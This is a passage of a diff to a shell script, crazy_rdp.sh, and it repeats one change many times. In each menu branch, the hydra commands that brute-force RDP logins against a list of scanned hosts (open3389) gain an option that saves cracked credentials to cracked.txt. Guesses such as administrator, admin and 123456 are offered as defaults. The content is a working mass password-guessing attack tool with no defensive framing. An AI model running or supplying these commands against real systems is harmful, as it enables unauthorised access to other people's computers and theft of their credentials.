-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11608,7 +11608,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11652,7 +11652,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11662,7 +11662,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11672,7 +11672,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11681,7 +11681,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11725,7 +11725,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11735,7 +11735,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11745,7 +11745,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11754,7 +11754,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11798,7 +11798,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11808,7 +11808,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11818,7 +11818,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11827,7 +11827,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11871,7 +11871,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11881,7 +11881,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11891,7 +11891,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11900,7 +11900,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11944,7 +11944,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11954,7 +11954,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11964,7 +11964,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11973,7 +11973,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12017,7 +12017,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12027,7 +12027,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12037,7 +12037,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12046,7 +12046,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12090,7 +12090,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12100,7 +12100,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12110,7 +12110,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12119,7 +12119,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12163,7 +12163,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12173,7 +12173,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12183,7 +12183,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12192,7 +12192,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12236,7 +12236,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12246,7 +12246,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12256,7 +12256,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12265,7 +12265,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12309,7 +12309,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12319,7 +12319,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12329,7 +12329,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12338,7 +12338,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12382,7 +12382,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12392,7 +12392,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12402,7 +12402,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12411,7 +12411,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12455,7 +12455,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12465,7 +12465,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12475,7 +12475,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12484,7 +12484,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12528,7 +12528,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12538,7 +12538,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12548,7 +12548,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12557,7 +12557,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12599,7 +12599,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12609,7 +12609,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12619,7 +12619,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12628,7 +12628,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12671,7 +12671,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12681,7 +12681,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12691,7 +12691,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12700,7 +12700,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12743,7 +12743,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12753,7 +12753,7 @@ fi
 if [ $brutmenu = "2" ]; then
